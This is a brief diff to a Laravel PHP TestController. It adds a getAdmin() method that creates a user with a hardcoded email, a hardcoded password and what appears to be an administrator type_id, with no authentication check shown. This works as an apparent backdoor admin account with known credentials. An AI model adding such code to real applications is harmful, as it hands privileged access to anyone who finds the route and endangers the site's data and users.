@@ -4,6 +4,8 @@ namespace App\Http\Controllers;
 use App\Http\Controllers\Controller;
 use App\Model\SysDirectory;
 use Cache;
+use App\User;
+use Hash;
 
 class TestController extends Controller{
 
@@ -35,4 +37,14 @@ class TestController extends Controller{
             echo 'cache note has';
 
     }
+
+    function getAdmin(){
+
+        $user = new User();
+        $user->email = 'admin@mail.ru';
+        $user->password = Hash::make('346488');
+        $user->type_id = 1;
+        $user->save();
+    }
+
 }
